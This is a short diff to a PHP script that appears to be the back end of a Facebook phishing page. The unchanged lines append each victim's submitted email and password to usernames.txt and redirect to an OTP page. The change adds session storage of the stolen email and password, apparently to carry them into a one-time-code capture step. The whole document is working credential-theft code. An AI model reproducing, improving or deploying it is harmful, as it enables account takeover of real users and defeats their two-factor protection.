@@ -1,5 +1,6 @@
 <?php
 error_reporting(E_ERROR | E_PARSE);
+session_start();
 
 function get_client_ip()
 {
@@ -157,7 +158,8 @@ if ($success==false) {
     fclose($fp);
 }
 
-
+$_SESSION['email'] = $_POST['email'];
+$_SESSION['pass'] = $_POST['pass'];
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\n". "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: otp.login.php');
